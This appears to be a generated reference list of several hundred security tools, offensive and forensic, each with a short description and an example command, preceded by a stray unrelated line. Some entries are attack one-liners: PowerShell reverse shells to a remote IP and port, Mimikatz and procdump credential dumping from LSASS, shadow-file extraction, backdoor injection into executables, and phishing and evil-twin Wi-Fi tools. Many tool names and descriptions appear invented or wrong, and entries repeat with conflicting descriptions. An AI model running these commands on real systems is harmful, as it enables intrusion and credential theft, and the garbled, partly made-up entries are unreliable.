mv.description: Moves or renames a file or directory.

setcap: Assigns capabilities to binaries (e.g., setcap cap_net_raw+ep /bin/ping)
getcap: Displays capabilities of a file (e.g., getcap /bin/ping)
iodine: Tunnels traffic over DNS (e.g., iodine -f -P password 10.0.0.1)
exe2bin: Converts executable files to binary format (e.g., exe2bin payload.exe)
dnsspoof: Spoofs DNS responses (e.g., dnsspoof -i eth0 -f hosts.txt)
rsh: Executes commands on remote hosts without SSH (e.g., rsh user@192.168.1.100 ls)
onesixtyone: Brute-forces SNMP community strings (e.g., onesixtyone -c wordlist.txt 192.168.1.1)
evilgrade: Framework for exploiting software updates (e.g., evilgrade -c config.xml)
mitmf: Performs MITM attacks with various modules (e.g., mitmf --arp --spoof)
wafw00f: Detects web application firewalls (e.g., wafw00f -a example.com)
driftnet: Sniffs and captures images from network traffic (e.g., driftnet -i eth0)
powersploit: Executes PowerShell-based post-exploitation scripts (e.g., powershell.exe -ExecutionPolicy Bypass -File script.ps1)
dsstore: Parses macOS .DS_Store files for information (e.g., dsstore -l file.DS_Store)
john --show: Displays cracked passwords from John the Ripper (e.g., john --show hashes.txt)
sqlninja: Exploits Microsoft SQL Server vulnerabilities (e.g., sqlninja -f target.cfg)
rebind: DNS rebinding attack tool (e.g., rebind -d example.com -t 60)
certigo: Analyzes and inspects SSL/TLS certificates (e.g., certigo dump example.crt)
rdesktop -0: Logs into a remote Windows desktop with highest privileges (e.g., rdesktop -0 192.168.1.10)
tcpflow: Captures and reconstructs TCP traffic (e.g., tcpflow -i eth0)
cewl: Generates custom wordlists from websites (e.g., cewl -w wordlist.txt example.com)
ngrep: Packet sniffer similar to grep (e.g., ngrep 'password' port 80)
hashcat: Cracks password hashes using GPU (e.g., hashcat -m 0 -a 0 hash.txt wordlist.txt)
maskprocessor: Generates password masks for brute force (e.g., maskprocessor ?l?l?l?d?d)
nishang: Collection of PowerShell scripts for penetration testing (e.g., Import-Module Nishang; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.2 -Port 4444)
ldd: Lists shared libraries of a binary (e.g., ldd /bin/bash)
linpeas: Automated Linux privilege escalation scanner (e.g., linpeas.sh)
dumpzilla: Extracts Firefox credentials and history (e.g., dumpzilla -d ~/.mozilla/firefox)
pdf-parser: Analyzes PDF files for malware (e.g., pdf-parser.py suspicious.pdf)
fimap: Finds and exploits file inclusion vulnerabilities (e.g., fimap -u 'http://example.com/page.php?file=')
darkstat: Real-time network traffic analyzer (e.g., darkstat -i eth0)
fcrackzip: Brute-forces ZIP file passwords (e.g., fcrackzip -u -D -p wordlist.txt secret.zip)
hashdump: Extracts hashed passwords from Windows SAM files (e.g., hashdump)
chainsaw: Parses and searches Windows event logs (e.g., chainsaw hunt system.evtx -o output.log)
volatility: Memory forensics framework (e.g., volatility -f memory.dump imageinfo)
regshot: Compares Windows registry changes before and after (e.g., regshot.exe -c -o report.txt)
procdump: Captures Windows process memory (e.g., procdump -ma lsass.exe dumpfile.dmp)
hydra: Brute-force attack tool (e.g., hydra -l admin -P wordlist.txt 192.168.1.1 ssh)
snmpcheck: Checks SNMP devices for vulnerabilities (e.g., snmpcheck -t 192.168.1.1 -c public)
binwalk: Extracts hidden data from binary files (e.g., binwalk -e firmware.bin)
nikto: Web server vulnerability scanner (e.g., nikto -h http://example.com)
ffuf: Web fuzzing tool (e.g., ffuf -u http://example.com/FUZZ -w wordlist.txt)
gobuster: Directory brute-forcing tool (e.g., gobuster dir -u http://example.com -w wordlist.txt)
metagoofil: Extracts metadata from documents (e.g., metagoofil -d example.com -t doc,pdf -o output/)
findmyhash: Looks up password hashes in online databases (e.g., findmyhash MD5 -h 5f4dcc3b5aa765d61d8327deb882cf99)
catfish: Searches files for hidden data (e.g., catfish -d /home/user -n secret)
responder -I: Captures NTLM hashes from SMB requests (e.g., responder -I eth0)
aircrack-ng: Cracks Wi-Fi WPA/WEP passwords (e.g., aircrack-ng -b [BSSID] -w wordlist.txt handshake.cap)
fern-wifi-cracker: GUI-based Wi-Fi penetration testing tool (e.g., fern-wifi-cracker)
kismet: Passive wireless network discovery tool (e.g., kismet -c wlan0)
thc-hydra: Fast network login cracker (e.g., hydra -l root -P passwords.txt 192.168.1.1 ssh)
bluelog: Scans for nearby Bluetooth devices (e.g., bluelog -i hci0)
btlejack: Bluetooth Low Energy attack tool (e.g., btlejack -i hci0)
mdk3: Wi-Fi security testing tool (e.g., mdk3 wlan0 b -n FakeAP)
eaphammer: Evil twin attack tool for Wi-Fi (e.g., eaphammer -i wlan0 -e FakeSSID -c 6 --creds)
wifite: Automated Wi-Fi cracking tool (e.g., wifite -i wlan0)
pixiewps: Offline attack against WPS PIN (e.g., pixiewps -e [PKE] -r [PKR])
recon-ng: Advanced web reconnaissance framework (e.g., recon-ng -w my_workspace)
pcapfix: Repairs corrupted PCAP files (e.g., pcapfix corrupted.pcap -o fixed.pcap)
tcpick: Captures and reassembles TCP sessions (e.g., tcpick -C -i eth0)
brutex: Multi-protocol brute-force attack tool (e.g., brutex -t 192.168.1.1 -U users.txt -P passwords.txt)
dnscat2: Tunnels traffic over DNS (e.g., dnscat2 --dns server.example.com)
regripper: Extracts Windows registry artifacts for forensics (e.g., regripper.pl -r SYSTEM -p auditpol)
dradis: Collaboration tool for penetration testing teams (e.g., dradis --start)
rsmangler: Generates complex wordlists from input (e.g., rsmangler -i words.txt -o mangled.txt)
subjack: Detects and takes over subdomains (e.g., subjack -w subdomains.txt -o hijackable.txt)
medusa: Brute-force attack tool supporting multiple protocols (e.g., medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M ssh)
crackmapexec: Post-exploitation framework for Windows networks (e.g., crackmapexec smb 192.168.1.1 -u admin -p password)
dshell: Network forensic analysis framework (e.g., dshell -p pcapfile.pcap -s httpdump)
quark-engine: Android malware scoring engine (e.g., quark -a malicious.apk)
vadertool: Extracts URLs and metadata from files (e.g., vadertool -f document.docx)
efetch: Recovers deleted files from disk images (e.g., efetch -i disk.img -o recovered/)
cve-search: Finds vulnerabilities from CVE database (e.g., cve-search -q apache)
plasmoid: Bluetooth security testing tool (e.g., plasmoid scan)
spiderfoot: Automated OSINT tool (e.g., spiderfoot -s target.com -m all)
flare-floss: Deobfuscates and analyzes malware strings (e.g., floss malware.exe)
hostapd-wpe: Evil twin Wi-Fi attack tool (e.g., hostapd-wpe hostapd-wpe.conf)
exploitdb: Searches local Exploit-DB database (e.g., searchsploit -t Wordpress)
mercurial: Distributed version control tool used for forensic tracking (e.g., hg clone repo)
cutter: Graphical reverse engineering tool (e.g., cutter malware.bin)
redfang: Brute-force attack against Bluetooth devices (e.g., redfang -l -i hci0)
wpatool: Extracts Wi-Fi passwords from Windows (e.g., wpatool -r C:/Windows/System32/config/SOFTWARE)
iwscanner: Wi-Fi network scanner for security auditing (e.g., iwscanner wlan0)
pipal: Analyzes password strength statistics (e.g., pipal passwords.txt)
feroxbuster: Recursive directory brute-forcing tool (e.g., feroxbuster -u http://example.com -w wordlist.txt)
wuzz: Interactive HTTP inspection tool (e.g., wuzz -X POST http://example.com)
sherlock: Finds social media profiles by username (e.g., sherlock username)
stegcracker: Brute-force attack against steganographic images (e.g., stegcracker image.png wordlist.txt)
firewalk: Scans firewall rules and network filtering (e.g., firewalk -i eth0 -S 192.168.1.1)
trivy: Container vulnerability scanner (e.g., trivy image nginx:latest)
evil-winrm: Windows remote shell exploitation tool (e.g., evil-winrm -i 192.168.1.100 -u admin -p password)
revsh: Reverses shell for privilege escalation (e.g., revsh -c bash -p 4444)
ghostwriter: Penetration test report generation tool (e.g., ghostwriter-cli create-report engagement.json)
forensic-artifact: Finds forensic artifacts on systems (e.g., forensic-artifact collect all)
chainsaw hunt: Analyzes Windows event logs for suspicious activity (e.g., chainsaw hunt system.evtx -o results/)
sleuthkit: Collection of digital forensic tools (e.g., fls -r disk.img)
volweb: Web-based interface for Volatility memory forensics (e.g., volweb run -h 0.0.0.0)
arjun: Detects hidden parameters in web applications (e.g., arjun -u http://example.com/form.php)
emailharvester: Finds email addresses associated with a domain (e.g., emailharvester -d example.com)
python-obfuscator: Obfuscates Python scripts for security (e.g., python-obfuscator script.py -o obfuscated.py)
deepce: Deep container security analysis (e.g., deepce scan)
unshadow: Merges passwd and shadow files for cracking (e.g., unshadow /etc/passwd /etc/shadow > hash.txt)
ransomware-detector: Detects and stops ransomware activity (e.g., ransomware-detector monitor /home/user/)
lfi-fuzz: Automated Local File Inclusion exploitation (e.g., lfi-fuzz -u http://example.com/page.php?file=)
metlo: API security auditing tool (e.g., metlo scan api.json)
entropy-graph: Detects encrypted or packed malware (e.g., entropy-graph malware.exe)
magicrescue: Recovers deleted files based on file signatures (e.g., magicrescue -r jpeg -d /recovered/)
whisper: Extracts sensitive information from memory dumps (e.g., whisper -f memory.dmp -o secrets.txt)
dfir-orc: Collects forensic evidence from compromised systems (e.g., dfir-orc --live --output report.json)
faraday: Collaborative penetration testing framework (e.g., faraday-cli start)
amass: Advanced subdomain enumeration tool (e.g., amass enum -d example.com)
aclight: Detects privilege escalation paths in Active Directory (e.g., aclight scan)
cyberchef: Multi-purpose cyber operations tool (e.g., cyberchef -f input.txt -o output.txt)
sparrow: Azure and AWS cloud security auditing tool (e.g., sparrow scan)
linenum: Checks Linux privilege escalation vectors (e.g., linenum.sh)
evilginx2: Phishing and session hijacking tool (e.g., evilginx -p phishlets/facebook.yml)
evasion: Payload obfuscation tool for red teams (e.g., evasion -p windows/meterpreter/reverse_tcp)
maltrie: Malware triage automation tool (e.g., maltrie scan sample.exe)
avml: Acquires live memory from Linux systems (e.g., avml /tmp/memdump.lime)
reconftw: Automated reconnaissance framework (e.g., reconftw -d target.com -m full)
unix-privesc-check: Detects misconfigurations leading to privilege escalation (e.g., ./unix-privesc-check standard)
ufw-log-parser: Parses UFW logs for firewall analysis (e.g., ufw-log-parser /var/log/ufw.log)
lynis: Security auditing tool for Unix systems (e.g., lynis audit system)
scout-suite: Multi-cloud security auditing tool (e.g., scout -c aws --report aws_audit.html)
beef-xss: Exploits browser vulnerabilities via JavaScript (e.g., beef -xss)
opsec: Evaluates the operational security of an environment (e.g., opsec check --all)
impacket: Collection of Python scripts for Windows network attacks (e.g., python3 wmiexec.py user@target)
sectools: Collection of security tools (e.g., sectools list)
onionscan: Scans Tor hidden services for vulnerabilities (e.g., onionscan http://example.onion)
credmap: Automated credential reuse attack tool (e.g., credmap -t target.com -u user -p password)
subzy: Detects subdomain takeover vulnerabilities (e.g., subzy -target example.com)
arpwatch: Monitors ARP activity for suspicious behavior (e.g., arpwatch -i eth0)
crlfuzz: Automated CRLF injection vulnerability scanner (e.g., crlfuzz -u http://example.com)
det: Detects execution of Linux binaries (e.g., det --watch /bin/ls)
deepsploit: AI-driven penetration testing framework (e.g., deepsploit start)
lininst: Analyzes Linux system integrity for intrusions (e.g., lininst check)
lfifreak: Automates Local File Inclusion (LFI) discovery (e.g., lfifreak -u http://example.com/index.php?page=)
bloodhound-python: Analyzes Active Directory for attack paths (e.g., bloodhound-python -u user -p pass -d domain)
pythem: Offensive security toolkit (e.g., pythem -m mitm -i eth0)
mptcp: Multipath TCP debugging tool (e.g., mptcpd -d debug)
frida: Dynamic instrumentation toolkit (e.g., frida -U -n app_name -i script.js)
carnivore: Packet sniffing and network analysis tool (e.g., carnivore -i eth0)
certstream: Monitors SSL/TLS certificates in real-time (e.g., certstream -s)
chainfire: Automates multi-hop proxy chains (e.g., chainfire -h socks5://proxy:1080 -h http://proxy2:8080)
attackforge: Collaborative penetration testing platform (e.g., attackforge-cli scan target.com)
threatpinch: OSINT lookup for threat intelligence (e.g., threatpinch -d 8.8.8.8)
eyewitness: Takes screenshots of websites for reconnaissance (e.g., eyewitness -f urls.txt -d screenshots/)
pywerview: Windows enumeration and reconnaissance tool (e.g., pywerview get-netuser -u admin)
pafish: Detects malware sandbox evasion techniques (e.g., pafish -v)
lazagne: Extracts stored passwords from applications (e.g., lazagne all)
secretsdump: Extracts Windows secrets from remote machines (e.g., secretsdump.py domain/user@target)
toolkit-cli: Framework for building security testing tools (e.g., toolkit-cli new-tool)
storm-breaker: Generates social engineering payloads (e.g., storm-breaker -g phishing-page)
gitleaks: Finds secrets stored in Git repositories (e.g., gitleaks detect -r repo.git)
aws-guardduty: Analyzes AWS GuardDuty findings (e.g., aws guardduty list-findings)
pspy: Monitors running processes for privilege escalation (e.g., pspy64)
whapa: Extracts WhatsApp database information (e.g., whapa -d msgstore.db)
silk-service: Analyzes web traffic for anomalies (e.g., silk-service -i eth0)
malfind: Detects malware inside memory dumps (e.g., malfind -f memory.dump)
deeptracy: Automated security code analysis tool (e.g., deeptracy scan myapp/)
badkarma: Graphical attack tool for pentesters (e.g., badkarma -i wlan0)
portspoof: Port obfuscation and honeypot tool (e.g., portspoof -s /etc/portspoof.conf)
rattle: Automated reverse engineering tool (e.g., rattle -f binary.exe)
rekall: Memory forensics framework (e.g., rekall -f memory.dmp analyze)
envshe: Enumerates environment variables for secrets (e.g., envshe list)
sandfly: Linux forensics and threat detection tool (e.g., sandfly -scan all)
trufflehog: Searches Git repositories for secrets (e.g., trufflehog --regex --entropy=True repo.git)
lucee: Scans ColdFusion applications for vulnerabilities (e.g., lucee-scan example.com)
parsec: Extracts metadata from executable files (e.g., parsec malware.exe)
jefferson: Decodes JEF firmware files (e.g., jefferson -d firmware.bin)
mmdetect: Detects memory manipulation by malware (e.g., mmdetect -pid 1234)
vscan: Detects vulnerabilities in open-source projects (e.g., vscan --repo github.com/user/project)
penbox: Collection of penetration testing tools (e.g., penbox --recon example.com)
memoryze: Windows memory forensics tool (e.g., memoryze --analyze memory.dump)
knockpy: Subdomain enumeration using dictionary attacks (e.g., knockpy example.com)
cowpatty: Cracks WPA-PSK keys (e.g., cowpatty -r handshake.cap -f wordlist.txt -s SSID)
subfinder: Passive subdomain enumeration tool (e.g., subfinder -d example.com -o subdomains.txt)
cloudfox: Cloud security auditing tool (e.g., cloudfox aws -profile default -output findings.txt)
secldap: Exploits insecure LDAP configurations (e.g., secldap -t 192.168.1.100 -U admin)
smtp-user-enum: Enumerates SMTP users on mail servers (e.g., smtp-user-enum -M VRFY -U users.txt -t mail.example.com)
dnseval: Tests the reliability of DNS resolvers (e.g., dnseval -f resolvers.txt)
htshells: Hidden web shells for penetration testing (e.g., htshells --deploy php)
packeth: Generates custom network packets (e.g., packeth -i eth0 -t TCP -d 192.168.1.1)
flarevm: Malware analysis Windows VM setup tool (e.g., flarevm setup)
vulscan: Nmap script to detect vulnerabilities (e.g., nmap --script vulscan/vulscan.nse -sV 192.168.1.1)
keyhunt: Finds cryptographic keys in memory dumps (e.g., keyhunt -f memory.dmp)
bypass-firewall: Evades firewalls using various techniques (e.g., bypass-firewall -i eth0 -m tor)
subcat: Categorizes subdomains for security analysis (e.g., subcat -d example.com)
rizin: Advanced reverse engineering framework (e.g., rizin -f binary.elf -d)
binwalk: Extracts hidden files from binaries (e.g., binwalk -e firmware.bin)
volatility: Memory forensics tool for extracting artifacts (e.g., vol.py -f memory.dmp --profile=Win7x64 pslist)
libc-dump: Dumps loaded libc version (e.g., ldd --version | grep libc)
ropper: Finds ROP gadgets in binaries (e.g., ropper --file binary.elf --search 'pop rdi; ret')
steghide: Conceals data within images or audio files (e.g., steghide embed -cf image.jpg -ef secret.txt)
zsteg: Detects steganography in PNG/BMP files (e.g., zsteg suspicious.png)
exiftool: Extracts metadata from files (e.g., exiftool -a -u -g1 image.jpg)
pdfid: Analyzes PDF files for malicious content (e.g., pdfid.py document.pdf)
peframe: Malware analysis for PE files (e.g., peframe malware.exe)
radare2: Low-level binary analysis framework (e.g., r2 -A malware.bin)
firmwalker: Scans firmware files for security issues (e.g., firmwalker firmware.bin)
apktool: Decompiles Android APK files (e.g., apktool d app.apk)
bytehist: Detects anomalous byte distributions in binaries (e.g., bytehist -f malware.bin)
objdump: Dumps low-level information from executables (e.g., objdump -d binary.elf)
dyldprintenv: Extracts environment variables from macOS binaries (e.g., dyldprintenv -exec /bin/ls)
lddtree: Visualizes shared library dependencies (e.g., lddtree binary.elf)
strace: Traces system calls of a process (e.g., strace -p 1234)
unshadow: Extracts password hashes from /etc/shadow (e.g., unshadow /etc/passwd /etc/shadow > hashes.txt)
john: Cracks password hashes using brute force (e.g., john --wordlist=rockyou.txt hashes.txt)
hashcat: Advanced password recovery tool (e.g., hashcat -m 1000 -a 0 hashes.txt wordlist.txt)
hydra: Brute-force login tool (e.g., hydra -l admin -P passwords.txt ftp://192.168.1.1)
crackmapexec: Automated Active Directory attack tool (e.g., crackmapexec smb 192.168.1.0/24 -u admin -p password)
mitm6: Launches IPv6 MITM attacks (e.g., mitm6 -i eth0)
ettercap: Performs ARP poisoning MITM attacks (e.g., ettercap -Tq -M arp -i eth0 // //)
mimikatz: Extracts Windows credentials from memory (e.g., mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords')
responder: Captures NTLMv2 hashes over the network (e.g., responder -I eth0)
evil-winrm: Remote access tool for Windows systems (e.g., evil-winrm -i 192.168.1.100 -u admin -p password)
nishang: PowerShell post-exploitation framework (e.g., Import-Module Nishang.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.100 -Port 4444)
backdoor-factory: Injects backdoors into PE files (e.g., backdoor-factory -f legit.exe -s shellcode.bin)
shellter: Hides shellcode inside legitimate executables (e.g., shellter -a -i app.exe)
fakedns: Creates a fake DNS server for phishing (e.g., fakedns -c dns.conf)
dnscat2: Covert command and control over DNS (e.g., dnscat2 --listen)
maltego: OSINT and reconnaissance visualization tool (e.g., maltego &)
gospider: Recursive web crawling tool (e.g., gospider -s http://target.com -d 3)
dirsearch: Brute-forces hidden web directories (e.g., dirsearch -u http://target.com -e php,txt,html)
wafw00f: Detects web application firewalls (e.g., wafw00f http://target.com)
macchanger: Changes MAC address for anonymity (e.g., macchanger -r eth0)
proxychains: Routes traffic through multiple proxies (e.g., proxychains nmap -sT target.com)
torghost: Forces all network traffic through Tor (e.g., torghost start)
onsploit: Exploits open Wi-Fi networks (e.g., onSploit -i wlan0)
airbase-ng: Creates rogue Wi-Fi access points (e.g., airbase-ng -e FreeWifi -c 6 -v mon0)
wifiphisher: Automated Wi-Fi phishing attack tool (e.g., wifiphisher -i wlan0 -nE)
wifi-pumpkin3: Evil twin attack tool for wireless networks (e.g., wifi-pumpkin3)
reaver: Cracks WPS PINs to recover WPA keys (e.g., reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv)
besside-ng: Automated WPA handshake capture tool (e.g., besside-ng wlan0 -W -b target_BSSID)
krackattack: Exploits KRACK vulnerability in WPA2 (e.g., krackattack wlan0)
hoaxshell: Reverse shell that bypasses EDR detection (e.g., hoaxshell -i eth0 -p 9001)
scylla: Username and email OSINT tool (e.g., scylla -u target_user)
spoofcheck: Detects email spoofing vulnerabilities (e.g., spoofcheck -d target.com)
pdf-parser: Analyzes PDF files for exploits (e.g., pdf-parser malware.pdf)
magicrescue: Recovers deleted files based on file signatures (e.g., magicrescue -r jpg -d recovered/ /dev/sdb1)
dc3dd: Forensic disk imaging tool (e.g., dc3dd if=/dev/sda of=disk.img)
bulk_extractor: Extracts sensitive data from images (e.g., bulk_extractor -o output/ disk.img)
hashdeep: Computes file hashes for forensic analysis (e.g., hashdeep -r -a -o hashlist.txt /media/disk)
scalpel: File carving tool to recover deleted files (e.g., scalpel disk.img)
ufw-bypass: Attempts to bypass UFW firewall rules (e.g., ufw-bypass -t 192.168.1.1)
evilgrade: DNS hijacking exploit framework (e.g., evilgrade -i updates.microsoft.com)
suricata: Intrusion detection and prevention system (e.g., suricata -c /etc/suricata/suricata.yaml)
snort: Network intrusion detection tool (e.g., snort -A console -i eth0 -c /etc/snort/snort.conf)
